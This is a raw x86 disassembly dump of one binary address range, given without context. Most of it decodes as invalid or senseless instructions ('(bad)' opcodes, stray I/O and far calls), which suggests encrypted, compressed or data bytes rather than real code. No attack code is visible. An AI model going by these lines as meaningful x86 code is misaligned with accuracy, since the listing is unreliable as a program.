  4157c5:	cs ds push ebp
  4157c8:	mov    dh,0xfa
  4157ca:	add    al,0x3b
  4157cc:	(bad)  
  4157cd:	inc    eax
  4157ce:	(bad)  
  4157cf:	neg    BYTE PTR ds:0x353c46a5
  4157d5:	mov    BYTE PTR [ebx+0x34dc2c61],dl
  4157db:	push   ds
  4157dc:	test   DWORD PTR [ebx+0xd1d45b1],eax
  4157e2:	sub    al,0xdb
  4157e4:	sbb    al,0xa3
  4157e6:	sbb    ch,BYTE PTR [esi-0x7b44dcf7]
  4157ec:	adc    ebx,ebx
  4157ee:	test   DWORD PTR [ebp-0x54095fef],ebp
  4157f4:	(bad)  
  4157f5:	iret   
  4157f6:	cli    
  4157f7:	pushf  
  4157f8:	mul    BYTE PTR [ecx+0x79]
  4157fb:	(bad)  
  4157fc:	pop    ss
  4157fd:	and    eax,0x9b5d6e32
  415802:	pop    ss
  415803:	out    0x2c,eax
  415805:	inc    edx
  415806:	out    0x0,al
  415808:	mov    BYTE PTR [esi],bl
  41580a:	(bad)  
  41580b:	add    al,0x97
  41580d:	sahf   
  41580e:	mov    al,ds:0x29e49e15
  415813:	jp     0x4157eb
  415815:	icebp  
  415816:	aam    0x8f
  415818:	dec    ebx
  415819:	pop    edi
  41581a:	mov    eax,0xcfc612ab
  41581f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415820:	popa   
  415821:	add    eax,0x1b34bce8
  415826:	fcom   QWORD PTR [ecx]
  415828:	mov    bh,0x88
  41582a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41582b:	inc    ebp
  41582c:	jmpw   0x7407
  415830:	aaa    
  415831:	test   BYTE PTR [eax+0x58],bh
  415834:	xchg   edx,eax
  415835:	xor    BYTE PTR [esi],0xc4
  415838:	test   al,0x56
  41583a:	dec    ecx
  41583b:	rol    DWORD PTR ds:0xdb542e41,0xd7
  415842:	inc    ecx
  415843:	ja     0x415826
  415845:	cli    
  415846:	xchg   ecx,eax
  415847:	pushf  
  415848:	sub    DWORD PTR [ebp-0x1b],0xffffff98
  41584c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41584d:	fs pop ebx
  41584f:	out    0xa5,eax
  415851:	dec    esp
  415852:	das    
  415853:	push   ss
  415854:	test   eax,0x6e064e77
  415859:	and    BYTE PTR [esi+edi*8-0x58938c62],ch
  415860:	stos   BYTE PTR es:[edi],al
  415861:	popa   
  415862:	jns    0x4158c1
  415864:	loope  0x4158b4
  415866:	fdivr  st(0),st
  415868:	shr    DWORD PTR [ecx],0x9
  41586b:	aas    
  41586c:	add    eax,0xe7dfc692
  415871:	mov    WORD PTR [esi],fs
  415873:	mov    es,WORD PTR [eax]
  415875:	and    bh,BYTE PTR [edx+0x65]
  415878:	rol    BYTE PTR [ebx+0x206a90e2],1
  41587e:	adc    BYTE PTR ds:0x37a27de3,ch
  415884:	jg     0x41587a
  415886:	inc    esi
  415887:	mov    bl,bh
  415889:	dec    esp
  41588a:	hlt    
  41588b:	fs mov eax,ebx
  41588e:	pop    esi
  41588f:	icebp  
  415890:	jno    0x4158d9
  415892:	sbb    DWORD PTR [edx+0x4a],edx
  415895:	push   ss
  415896:	mov    esi,0x8cdd4104
  41589b:	jb     0x41581e
  41589d:	mov    bh,0xe6
  41589f:	jg     0x4158fd
  4158a1:	pusha  
  4158a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158a3:	xlat   BYTE PTR ds:[ebx]
  4158a4:	pop    ds
  4158a5:	test   eax,0x312c07d3
  4158aa:	test   BYTE PTR [eax],bh
  4158ac:	mov    ebx,0xa70f062c
  4158b1:	iret   
  4158b2:	int    0x44
  4158b4:	sbb    ch,cl
  4158b6:	dec    ebp
  4158b7:	(bad)  
  4158b8:	jae    0x4158e4
  4158ba:	xchg   esi,eax
  4158bb:	and    DWORD PTR [eax+0x2936a509],eax
  4158c1:	push   edi
  4158c2:	loop   0x4158d9
  4158c4:	enter  0xc64,0xb0
  4158c8:	ss jb  0x41592b
  4158cb:	or     esp,DWORD PTR [edx-0x7]
  4158ce:	hlt    
  4158cf:	sbb    ebp,eax
  4158d1:	push   eax
  4158d2:	and    cl,BYTE PTR [edi-0x5f7c53d3]
  4158d8:	cmp    BYTE PTR [edx-0x28],bh
  4158db:	repz sub ecx,DWORD PTR [edi]
  4158de:	xchg   esi,eax
  4158df:	mov    edx,eax
  4158e1:	sub    DWORD PTR [ecx+eax*2],esi
  4158e4:	pop    eax
  4158e5:	and    ebx,edx
  4158e7:	fmul   DWORD PTR [ecx]
  4158e9:	scas   eax,DWORD PTR es:[edi]
  4158ea:	xchg   ebx,eax
  4158eb:	std    
  4158ec:	test   DWORD PTR [esi],esi
  4158ee:	loopne 0x415964
  4158f0:	sub    eax,0xc33b3595
  4158f5:	push   edx
  4158f6:	push   es
  4158f7:	xor    BYTE PTR [edi],ah
  4158f9:	pusha  
  4158fa:	add    al,0x26
  4158fc:	int3   
  4158fd:	jge    0x4158e1
  4158ff:	mov    ebx,0x55b3b31e
  415904:	jns    0x41591c
  415906:	mov    ch,0x7c
  415908:	push   0x3e83eca4
  41590d:	sub    eax,0xdf374827
  415912:	pop    ds
  415913:	fdiv   DWORD PTR gs:[edx-0x3b]
  415917:	mov    ebp,0xa0372f79
  41591c:	sti    
  41591d:	xor    esi,DWORD PTR [ecx+0x2c0e5907]
  415923:	mov    WORD PTR [ecx],ss
  415925:	cdq    
  415926:	fcmovnbe st,st(0)
  415928:	jl     0x415908
  41592a:	sti    
  41592b:	fwait
  41592c:	xchg   esi,eax
  41592d:	inc    esi
  41592e:	jno    0x4158ed
  415930:	lds    eax,FWORD PTR [eax]
  415932:	das    
  415933:	(bad)  
  415934:	pop    edi
  415935:	inc    esi
  415936:	fisub  DWORD PTR [eax+eax*1+0x5e]
  41593a:	lods   eax,DWORD PTR ds:[esi]
  41593b:	mov    dl,0x63
  41593d:	jnp    0x4158f8
  41593f:	xchg   BYTE PTR [edi+0x33],cl
  415942:	jo     0x415986
  415944:	(bad)  
  415945:	xchg   edx,eax
  415946:	stc    
  415947:	push   cs
  415948:	lahf   
  415949:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41594a:	lock retf 0x9a96
  41594e:	retf   
  41594f:	clc    
  415950:	pop    ebx
  415951:	push   es
  415952:	les    edx,FWORD PTR [edi+0x1f7870bc]
  415958:	jecxz  0x415956
  41595a:	pop    ebp
  41595b:	int3   
  41595c:	xor    al,0xa9
  41595e:	xchg   BYTE PTR [edx+0x5b],bh
  415961:	xchg   ecx,eax
  415962:	mov    bl,BYTE PTR [ebx+ebp*2-0x4fa57345]
  415969:	sub    ebx,DWORD PTR [esi]
  41596b:	cmp    esp,DWORD PTR [esi+esi*4]
  41596e:	mov    ebx,0xee586934
  415973:	add    esi,DWORD PTR [esi+0x3e]
  415976:	rcr    DWORD PTR [esi+0x30],cl
  415979:	fnstcw WORD PTR [edx]
  41597b:	pop    es
  41597c:	xchg   DWORD PTR [edx-0x7b607c20],ebx
  415982:	popf   
  415983:	push   edi
  415984:	(bad)  
  415985:	in     al,dx
  415986:	call   0x8c58:0xf81c0231
  41598d:	inc    ebp
  41598e:	loope  0x4159fa
  415990:	inc    ebx
  415991:	dec    esi
  415992:	outs   dx,DWORD PTR cs:[esi]
  415994:	adc    al,0x6f
  415996:	aas    
  415997:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415998:	in     eax,dx
  415999:	mov    ds:0x67918e90,al
  41599e:	dec    eax
  41599f:	jmp    0x6cc266f7
  4159a4:	stos   DWORD PTR es:[edi],eax
  4159a5:	or     dl,BYTE PTR [ebx-0x29]
  4159a8:	mov    ecx,0xefa32a36
  4159ad:	pop    ss
  4159ae:	xor    al,0xec
  4159b0:	sub    cl,dh
  4159b2:	mov    ebp,0x488003fa
  4159b7:	mov    bl,0xfd
  4159b9:	stc    
  4159ba:	mov    bh,0xe
  4159bc:	retf   0xa7ca
  4159bf:	pusha  
  4159c0:	cmp    eax,DWORD PTR [ebx-0x3f]
  4159c3:	leave  
  4159c4:	call   0x13a0bd1d
  4159c9:	adc    ebx,0xdb2f9515
  4159cf:	sub    DWORD PTR [edx+edx*8+0x55e9cbf0],0x2fc80a41
  4159da:	popf   
  4159db:	call   FWORD PTR [ebp+0xa]
  4159de:	les    edi,FWORD PTR [edi-0x7c267e7b]
  4159e4:	loop   0x415a27
  4159e6:	lahf   
  4159e7:	push   es
  4159e8:	retf   
  4159e9:	out    dx,al
  4159ea:	mov    ebp,DWORD PTR [edi+edi*2]
  4159ed:	mov    edi,0x82648628
  4159f2:	test   eax,0x9d872e90
  4159f7:	mov    esp,0x116c6c6f
  4159fc:	(bad)  
  4159fe:	dec    ecx
  4159ff:	jo     0x415a0c
  415a01:	and    bh,BYTE PTR [ebx+0x66]
  415a04:	outs   dx,DWORD PTR ds:[esi]
  415a05:	xor    DWORD PTR [eax-0x32],0x4150128e
  415a0c:	data16 cmp al,0x90
  415a0f:	pop    esp
  415a10:	xchg   DWORD PTR [ebx-0x72],ebx
  415a13:	pop    ss
  415a14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a15:	xchg   esi,eax
  415a16:	mov    ebp,0x39febd82
  415a1b:	lods   al,BYTE PTR ds:[esi]
  415a1c:	enter  0xcaf9,0x29
  415a20:	cmp    DWORD PTR [eax-0x6585e7ba],edi
  415a26:	mov    esp,0x245c4760
  415a2b:	add    esi,DWORD PTR [edi-0x5a65424b]
  415a31:	adc    al,BYTE PTR [edx]
  415a33:	cmp    al,BYTE PTR [ebp+0x34182b6a]
  415a39:	lock pop edi
  415a3b:	jo     0x4159c0
  415a3d:	mov    ebx,0xe6a9b1a6
  415a42:	je     0x415a34
  415a44:	imul   dh
  415a46:	in     eax,dx
  415a47:	jge    0x415aa9
  415a49:	pop    es
  415a4a:	(bad)  
  415a4b:	int3   
  415a4c:	xchg   ecx,eax
  415a4d:	adc    al,0xd0
  415a4f:	pop    ss
  415a50:	mov    ecx,0x606788ae
  415a55:	bound  ecx,QWORD PTR [edi+0x41]
  415a58:	mov    ecx,0x31f27a2
  415a5d:	shl    DWORD PTR [edx+0x201a672c],1
  415a63:	nop
  415a64:	call   0x4e6fc4e7
  415a69:	lds    esi,FWORD PTR [ebp-0x3d]
  415a6c:	mov    dl,0x7
  415a6e:	mov    ebx,0xc330aa24
  415a73:	loopne 0x415a1f
  415a75:	inc    edi
  415a76:	fsub   DWORD PTR [eax+0x71398ccb]
  415a7c:	jbe    0x415a54
  415a7e:	pop    ebp
  415a7f:	(bad)  
  415a80:	mov    edi,0x9e9923e3
  415a85:	push   0x8d16d826
  415a8a:	xor    edx,ecx
  415a8c:	lea    eax,[edx+eax*1+0x32729c]
  415a93:	jmp    0x415d77
  415a98:	sub    dl,BYTE PTR [eax-0x24]
  415a9b:	mov    esp,0x6eaabc6a
  415aa0:	popa   
  415aa1:	pop    ecx
  415aa2:	xchg   ebp,eax
  415aa3:	aas    
  415aa4:	mov    esp,0xb8f577fe
  415aa9:	or     eax,0x7eb9707f
  415aae:	jo     0x415b20
  415ab0:	in     eax,dx
  415ab1:	addr16 xchg esp,eax
  415ab3:	sub    BYTE PTR [edx+esi*8],dh
  415ab6:	pop    eax
  415ab7:	mov    ebx,0x59b8f54c
  415abc:	(bad)  
  415abd:	dec    edx
  415abe:	dec    ebp
  415abf:	jle    0x415ac7
  415ac1:	test   al,0xfd
  415ac3:	pushf  
  415ac4:	xor    DWORD PTR [edi-0x28],edi
  415ac7:	lock sub BYTE PTR [ebp*1+0x27b18f3d],dl
  415acf:	shl    DWORD PTR [ecx],1
  415ad1:	loopne 0x415abf
  415ad3:	xchg   esp,eax
  415ad4:	bnd jns 0x415b56
  415ad7:	(bad)  
  415ad9:	lods   eax,DWORD PTR ds:[esi]
  415ada:	inc    DWORD PTR [eax+0x751f94c6]
  415ae0:	test   DWORD PTR [ebx+0x57f7e347],0x43c073bb
  415aea:	cs cwde 
  415aec:	scas   al,BYTE PTR es:[edi]
  415aed:	pop    esi
  415aee:	bound  edx,QWORD PTR [edx-0x7b]
  415af1:	jno    0x415b22
  415af3:	dec    esi
  415af4:	xor    al,0xcd
  415af6:	outs   dx,BYTE PTR ds:[esi]
  415af7:	mov    dl,0x18
  415af9:	push   ecx
  415afa:	push   eax
  415afb:	push   ecx
  415afc:	std    
  415afd:	aaa    
  415afe:	cdq    
  415aff:	int3   
  415b00:	int    0xa0
  415b02:	jp     0x415b30
  415b04:	inc    esi
  415b05:	neg    BYTE PTR fs:[eax]
  415b08:	(bad)  
  415b0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b0b:	popa   
  415b0c:	shr    DWORD PTR [edi+0x2d7c5f06],0x99
  415b13:	retf   
  415b14:	sub    esp,ebx
  415b16:	pop    ebp
  415b17:	out    0xa9,al
  415b19:	pop    ebp
  415b1a:	repnz push esp
  415b1c:	jae    0x415b1c
  415b1e:	aam    0xde
  415b20:	pop    esi
  415b21:	pop    es
  415b22:	(bad)  
  415b23:	or     BYTE PTR [edi],0x52
  415b26:	loop   0x415b94
  415b28:	mov    ebp,0x9303b884
  415b2d:	leave  
  415b2e:	dec    ecx
  415b2f:	dec    BYTE PTR [esi+0x77]
  415b32:	cs sbb eax,0x437d03e8
  415b38:	inc    ebx
  415b39:	add    ch,al
  415b3b:	repz loopne 0x415af5
  415b3e:	cs js  0x415b09
  415b41:	dec    edi
  415b42:	es mov bh,0xd6
  415b45:	sahf   
  415b46:	mov    ebx,0xa68e9c4f
  415b4b:	pop    edx
  415b4c:	pop    ss
  415b4d:	jmp    0x415b14
  415b4f:	scas   eax,DWORD PTR es:[edi]
  415b50:	inc    ecx
  415b51:	cmp    al,BYTE PTR [ebx]
  415b53:	lahf   
  415b54:	dec    esi
  415b55:	xor    bl,BYTE PTR [eax]
  415b57:	jmp    0x415ba1
  415b59:	cli    
  415b5a:	pop    ds
  415b5b:	es out 0x7f,eax
  415b5e:	stc    
  415b5f:	stc    
  415b60:	imul   edi,DWORD PTR [ebp-0x268b5a56],0xffffffe3
  415b67:	mov    eax,0xb5f7f02b
  415b6c:	xor    ebx,esp
  415b6e:	pop    ecx
  415b6f:	jnp    0x415bc8
  415b71:	bswap  esi
  415b73:	add    dh,BYTE PTR [edx]
  415b75:	mov    dl,0xfd
  415b77:	pop    edi
  415b78:	(bad)  
  415b79:	in     al,0x82
  415b7b:	inc    edi
  415b7d:	stos   DWORD PTR es:[edi],eax
  415b7e:	clc    
  415b7f:	aas    
  415b80:	iret   
  415b81:	mov    ds:0x2ac71f9f,al
  415b86:	ins    DWORD PTR es:[edi],dx
  415b87:	jb     0x415ba5
  415b89:	xor    ah,ah
  415b8b:	inc    ebx
  415b8c:	inc    eax
  415b8d:	test   al,0x58
  415b8f:	ss inc esp
  415b91:	outs   dx,DWORD PTR ds:[esi]
  415b92:	ja     0x415bae
  415b94:	pop    eax
  415b95:	cmp    BYTE PTR [eax+0x48],dh
  415b98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b99:	mov    edx,0x1df62f56
  415b9e:	sbb    eax,0xd3b76a08
  415ba3:	jnp    0x415b96
  415ba5:	adc    ch,cl
  415ba7:	inc    edi
  415ba8:	mov    esi,0xbbdb0b07
  415bad:	pop    edx
  415bae:	imul   edi,DWORD PTR fs:[eax],0xded32cbf
  415bb5:	mov    bh,0xe
  415bb7:	jnp    0x415bca
  415bb9:	and    edx,eax
  415bbb:	adc    al,0xec
  415bbd:	xchg   ecx,eax
  415bbe:	lds    edx,FWORD PTR ds:0xc1cd4ba3
  415bc4:	push   esi
  415bc5:	inc    esp
  415bc6:	cmp    BYTE PTR [ebx],dh
  415bc8:	cdq    
  415bc9:	test   BYTE PTR [ebx],bh
  415bcb:	repz push 0xdc74337b
  415bd1:	aaa    
  415bd2:	(bad)  
  415bd3:	jge    0x415c36
  415bd5:	pop    ebp
  415bd6:	cwde   
  415bd7:	sub    ecx,DWORD PTR [edx+ebx*2]
  415bda:	adc    dh,BYTE PTR [ebp+eiz*4+0x492ea84a]
  415be1:	push   ebx
  415be2:	pusha  
  415be3:	xchg   ebx,eax
  415be4:	pushf  
  415be5:	jmp    0x415b91
  415be7:	retf   0xd20c
  415bea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415beb:	imul   ebx,DWORD PTR [ebx-0x6d0501ec],0xad88c37e
  415bf5:	and    eax,0xeade9761
  415bfa:	int    0xe3
  415bfc:	mov    DWORD PTR [edi],esp
  415bfe:	mov    cl,0xa5
  415c00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c01:	or     BYTE PTR [ecx+0x4d2959b1],dh
  415c07:	call   0x8e5:0xbb574932
  415c0e:	fcomi  st,st(6)
  415c10:	lahf   
  415c11:	call   0x30f9:0xa4206907
  415c18:	xor    ch,al
  415c1a:	xchg   edi,eax
  415c1b:	sbb    ebp,DWORD PTR [edx]
  415c1d:	test   eax,0xc98aec78
  415c22:	es out 0xf0,eax
  415c25:	std    
  415c26:	push   ss
  415c27:	loope  0x415bf4
  415c29:	mov    ebx,0x35875b8
  415c2e:	inc    esp
  415c2f:	xor    BYTE PTR [edx-0x4b],dl
  415c32:	and    al,BYTE PTR [ecx+0x84c7792]
  415c38:	aas    
  415c39:	xchg   ebp,eax
  415c3a:	push   ss
  415c3b:	add    esi,edi
  415c3d:	fnstcw WORD PTR [esi+0x6a]
  415c40:	xchg   esp,eax
  415c41:	outs   dx,BYTE PTR ds:[esi]
  415c42:	cmc    
  415c43:	ds dec ecx
  415c45:	add    BYTE PTR [esi-0x6443e16e],0x7
  415c4c:	pop    ebx
  415c4d:	sbb    DWORD PTR [ecx],ebp
  415c4f:	ins    BYTE PTR es:[edi],dx
  415c50:	fistp  WORD PTR [ecx+eiz*8-0x67]
  415c54:	sub    ebx,esp
  415c56:	sar    dh,cl
  415c58:	mov    eax,ds:0xc8fbd29b
  415c5d:	iret   
  415c5e:	mov    ebx,DWORD PTR ds:[ecx-0x6f6c9f94]
  415c65:	jl     0x415cde
  415c67:	cmp    eax,0xc01660a4
  415c6c:	ret    0x1694
  415c6f:	xor    BYTE PTR [ebp-0x7416016b],bh
  415c75:	(bad)
  415c78:	inc    eax
  415c79:	int    0xe6
  415c7b:	xchg   ebx,eax
  415c7c:	xchg   esi,eax
  415c7d:	and    dl,bh
  415c7f:	jne    0x415c48
  415c81:	sbb    al,0x93
  415c83:	dec    edx
  415c84:	mov    ecx,0x4e48b176
  415c89:	add    al,0x60
  415c8b:	sub    eax,0xffffff8e
  415c8e:	outs   dx,DWORD PTR ds:[esi]
  415c8f:	cmp    DWORD PTR [edx+0x7b17d8aa],ebx
  415c95:	xor    eax,DWORD PTR [edi]
  415c97:	outs   dx,BYTE PTR ds:[esi]
  415c98:	jae    0x415cc7
  415c9a:	jecxz  0x415cde
  415c9c:	cmp    al,0x43
  415c9e:	sub    cl,BYTE PTR [edi+0x36bf5dc5]
  415ca4:	xor    DWORD PTR [ecx-0x8],eax
  415ca7:	lea    ebp,[ecx]
  415ca9:	mov    ch,0x4a
  415cab:	call   0x28509110
  415cb0:	mov    edi,0x254e28df
  415cb5:	mov    eax,ds:0x3107dce1
  415cba:	push   esp
  415cbb:	inc    edx
  415cbc:	and    esp,DWORD PTR ds:0x343159e5
  415cc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cc3:	retf   0x3a3f
  415cc6:	push   esi
  415cc7:	xchg   ebx,eax
  415cc8:	jmp    0x73f5cfa
  415ccd:	scas   eax,DWORD PTR es:[edi]
  415cce:	rcr    esi,cl
  415cd0:	cwde   
  415cd1:	data16 test BYTE PTR [edi],bh
  415cd4:	mov    fs,WORD PTR [ebx-0x78]
  415cd7:	push   ss
  415cd8:	inc    esi
  415cd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415cda:	int3   
  415cdb:	dec    esi
  415cdc:	xchg   ecx,eax
  415cdd:	sbb    eax,0x974d9331
  415ce2:	or     ah,BYTE PTR [eax+ecx*4-0x66]
  415ce6:	std    
  415ce7:	dec    edx
  415ce8:	popa   
  415ce9:	mov    ah,0xa0
  415ceb:	dec    esi
  415cec:	sub    BYTE PTR [ebx+esi*1],al
  415cef:	xor    ebp,DWORD PTR ds:0xcf2b66cc
  415cf5:	aaa    
  415cf6:	sahf   
  415cf7:	mov    al,0x26
  415cf9:	ds push esi
  415cfb:	pop    eax
  415cfc:	lods   al,BYTE PTR ds:[esi]
  415cfd:	imul   ebp,DWORD PTR [esi+0x58087fd6],0x71
  415d04:	or     eax,0x320252c6
  415d09:	xor    eax,0xea16a6fc
  415d0e:	mov    DWORD PTR [edi],esi
  415d10:	mov    ebx,0x6758ad27
  415d15:	cmp    BYTE PTR [ebp+0x2e],al
  415d18:	ret    
  415d19:	test   ch,ah
  415d1b:	sbb    edx,0xfffffff6
  415d1e:	idiv   BYTE PTR [edi]
  415d20:	imul   ebp,DWORD PTR [ecx],0x1e571fdb
  415d26:	or     al,0xf0
  415d28:	jmp    0x415d86
  415d2a:	push   esi
  415d2b:	outs   dx,DWORD PTR ds:[esi]
  415d2c:	xchg   ecx,eax
  415d2d:	xchg   ebp,eax
  415d2e:	xor    eax,edi
  415d30:	mov    bl,BYTE PTR [edi]
  415d32:	mov    ds:0x99486181,eax
  415d37:	dec    edi
  415d38:	ins    BYTE PTR es:[edi],dx
  415d39:	pop    ebp
  415d3a:	(bad)
  415d3e:	rcl    edi,1
  415d40:	fild   QWORD PTR [ebp-0x3d]
  415d43:	(bad)  
  415d44:	repz pop esi
  415d46:	imul   esp,DWORD PTR [esi-0x1aaee935],0x3554593f
  415d50:	rcr    eax,1
  415d52:	xchg   ecx,eax
  415d53:	mov    cl,0x39
  415d55:	cmc    
  415d56:	(bad)  
  415d57:	imul   edi,DWORD PTR ds:0xe8f0d056,0xffffff96
  415d5e:	shr    DWORD PTR [ebp+0xaa59c70],1
  415d64:	loope  0x415dc6
  415d66:	mov    ah,BYTE PTR [ebp+0x61daf816]
  415d6c:	inc    eax
  415d6d:	push   0xffffffa0
  415d6f:	cmc    
  415d70:	das    
  415d71:	dec    ebx
  415d72:	mov    al,0x4
  415d74:	xchg   ecx,eax
  415d75:	popa   
  415d76:	pop    ecx
  415d77:	mov    edx,DWORD PTR [ebp+0x8]
  415d7a:	mov    edi,DWORD PTR [ebp-0x24]
  415d7d:	mov    DWORD PTR [edi+edx*4],eax
  415d80:	mov    eax,DWORD PTR [ebp-0x18]
  415d83:	jmp    0x416067
  415d88:	dec    eax
  415d89:	fistp  QWORD PTR [edx+0x75a9712b]
  415d8f:	arpl   bx,ax
  415d91:	pop    ss
  415d92:	jp     0x415d95
  415d94:	dec    esp
  415d95:	sbb    DWORD PTR [ebx+ebx*4+0x707f0a81],ebx
  415d9c:	mov    ecx,0x5d70707e
  415da1:	mov    al,ds:0x3583073d
  415da6:	mov    ?,WORD PTR [esi+ebx*8-0x271a30c6]
  415dad:	inc    ebx
  415dae:	mov    ecx,DWORD PTR [ebp+0x12]
  415db1:	stos   DWORD PTR es:[edi],eax
  415db2:	jb     0x415e22
  415db4:	dec    esi
  415db5:	in     al,dx
  415db6:	pop    edx
  415db7:	(bad)  
  415db8:	cmp    DWORD PTR [ebx-0x1],esi
  415dbb:	(bad)  [edx+0x6bc2d082]
  415dc1:	jb     0x415d50
  415dc3:	sub    ebp,DWORD PTR [edi-0x7f]
  415dc6:	loopne 0x415e21
  415dc8:	pop    ecx
  415dc9:	sub    dl,BYTE PTR [ebx-0x7190aa3f]
  415dcf:	mov    bl,0x3d
  415dd1:	jmp    0x11dde291
  415dd6:	push   cs
  415dd7:	icebp  
  415dd8:	std    
  415dd9:	rcr    BYTE PTR [edi+0xbda6bb1],cl
  415ddf:	sub    ebx,DWORD PTR [edi+0x22a761f7]
  415de5:	or     al,0x7a
  415de7:	sub    bh,al
  415de9:	jns    0x415e39
  415deb:	jo     0x415e3e
  415ded:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415dee:	mov    al,ds:0xb095fef8
  415df3:	xchg   esp,eax
  415df4:	cmp    eax,edx
  415df6:	fwait
  415df7:	div    BYTE PTR [ebx-0x44070120]
  415dfd:	jmp    0x415dc3
  415dff:	pop    esi
  415e00:	add    DWORD PTR [esi+0xf],edi
  415e03:	int    0xb8
  415e05:	jae    0x415df8
  415e07:	jmp    DWORD PTR [edi]
  415e09:	xor    ecx,DWORD PTR [ebp+0x1d948a2]
  415e0f:	sub    BYTE PTR [ecx+0x4a],bl
  415e12:	sbb    eax,DWORD PTR [eax+0x31]
  415e15:	outs   dx,BYTE PTR ds:[esi]
  415e16:	adc    DWORD PTR [ebp-0x82f0da0],ecx
  415e1c:	imul   edx,ebp,0xffffffb5
  415e1f:	in     eax,dx
  415e20:	ror    BYTE PTR [esi-0x4ae5f20b],1
  415e26:	int3   
  415e27:	xchg   edi,eax
  415e28:	outs   dx,BYTE PTR ds:[esi]
  415e29:	ins    DWORD PTR es:[edi],dx
  415e2a:	in     eax,0x9b
  415e2c:	lea    ebp,[eax+0x7b76dd4]
  415e32:	call   0x1ad7:0x7491358a
  415e39:	ror    BYTE PTR [eax-0x6],0xcf
  415e3d:	scas   al,BYTE PTR es:[edi]
  415e3e:	adc    al,0x1b
  415e40:	lock pop edx
  415e42:	mov    esp,0xce3d9a48
  415e47:	test   al,0x92
  415e4a:	popa   
  415e4b:	cmp    al,BYTE PTR [ecx-0x73]
  415e4e:	bound  edi,QWORD PTR [esi-0x20346b36]
  415e54:	ret    0x8cec
  415e57:	jns    0x415ebe
  415e59:	retf   
  415e5a:	lods   eax,DWORD PTR ds:[esi]
  415e5b:	inc    edx
  415e5c:	add    eax,0x83e38c33
  415e61:	sbb    DWORD PTR [eax+edi*1],esp
  415e64:	ds sub eax,0xb83873ea
  415e6a:	xor    ecx,edx
  415e6c:	test   esi,edx
  415e6e:	fidiv  WORD PTR [eax+0x35b7c7be]
  415e74:	jmp    0x4486:0x1edeb00e
  415e7b:	or     ecx,DWORD PTR [ecx]
  415e7d:	inc    BYTE PTR [eax]
  415e7f:	scas   al,BYTE PTR es:[edi]
  415e80:	add    al,0x15
  415e82:	xchg   DWORD PTR [esi],ecx
  415e84:	jg     0x415e9b
  415e86:	jle    0x415e22
  415e88:	or     eax,0x54da7761
  415e8d:	sub    bh,BYTE PTR [ebx+ecx*4]
  415e90:	lods   al,BYTE PTR ds:[esi]
  415e91:	dec    esp
  415e92:	test   DWORD PTR [ecx+0x19],eax
  415e95:	loope  0x415e57
  415e97:	pop    eax
  415e98:	xlat   BYTE PTR ds:[ebx]
  415e99:	stc    
  415e9a:	call   ebx
  415e9c:	loope  0x415ef2
  415e9e:	mov    ds:0x1b6909fb,al
  415ea3:	jp     0x415ee9
  415ea5:	sbb    eax,0x4a390451
  415eaa:	dec    esi
  415eab:	cdq    
  415eac:	cmp    DWORD PTR [eax+0x674cfb9e],edx
  415eb2:	cmp    BYTE PTR [eax-0x2eced98d],ah
  415eb8:	mov    ah,0x54
  415eba:	adc    DWORD PTR [edi],ebx
  415ebc:	pop    edi
  415ebd:	push   edi
  415ebe:	and    al,0x4a
  415ec0:	cld    
  415ec1:	sub    BYTE PTR [ebx-0x33],dl
  415ec4:	aas    
  415ec5:	scas   eax,DWORD PTR es:[edi]
  415ec6:	add    eax,0xa6ddbb05
  415ecb:	sub    al,0x8e
  415ecd:	pop    ebx
  415ece:	pop    eax
  415ecf:	dec    edx
  415ed0:	(bad)  
  415ed1:	lahf   
  415ed2:	aam    0x5b
  415ed4:	mov    bh,0x4b
  415ed6:	leave  
  415ed7:	ins    DWORD PTR es:[edi],dx
  415ed8:	hlt    
  415ed9:	inc    BYTE PTR [esi+0x533fcee1]
  415edf:	cli    
  415ee0:	pop    es
  415ee1:	xor    dl,BYTE PTR [ecx+edi*1-0x42]
  415ee5:	jmp    0xddbb9bf9
  415eea:	in     eax,0xd5
  415eec:	dec    eax
  415eed:	(bad)  
  415eee:	cmp    eax,0x387b07b3
  415ef3:	ror    BYTE PTR [edi+0x3d],1
  415ef6:	sub    DWORD PTR [ecx],ebx
  415ef8:	cmp    esp,DWORD PTR [ecx-0x62]
  415efb:	pushf  
  415efc:	mov    ch,0x2d
  415efe:	xchg   esi,esi
  415f00:	and    DWORD PTR [edi],edi
  415f02:	pop    ss
  415f03:	jmp    0x488e35b2
  415f08:	mov    eax,0x10ddac94
  415f0d:	pop    ss
  415f0e:	sbb    edx,esi
  415f10:	sahf   
  415f11:	js     0x415eb5
  415f13:	xchg   ebp,eax
  415f14:	popf   
  415f15:	add    ecx,DWORD PTR [esi]
  415f17:	(bad)  [ebp-0x5e49d9a7]
  415f1d:	lock and BYTE PTR [edx+ebp*4],bh
  415f21:	pop    esp
  415f22:	inc    edi
  415f23:	cmp    edx,DWORD PTR [edx+0x2a]
  415f26:	sbb    dl,BYTE PTR [ebx]
  415f28:	(bad)  
  415f29:	sti    
  415f2a:	jle    0x415ec8
  415f2c:	pop    esp
  415f2d:	dec    esp
  415f2e:	xchg   edi,eax
  415f2f:	cmovs  esp,DWORD PTR [edx-0x50a72ded]
  415f36:	pushf  
  415f37:	sbb    dh,bh
  415f39:	push   edx
  415f3a:	outs   dx,DWORD PTR ds:[esi]
  415f3b:	call   FWORD PTR [edx+0x73]
  415f3e:	imul   edi,DWORD PTR [ebx+ebx*1-0x2a],0x5e
  415f43:	call   0xd7eaf8e6
  415f48:	retf   0xfadf
  415f4b:	fdiv   QWORD PTR [edx+0x7f]
  415f4e:	cmp    BYTE PTR [eax],cl
  415f50:	mov    esp,0x5687ef93
  415f55:	xchg   ebp,eax
  415f56:	mov    BYTE PTR [ecx-0x1f],dl
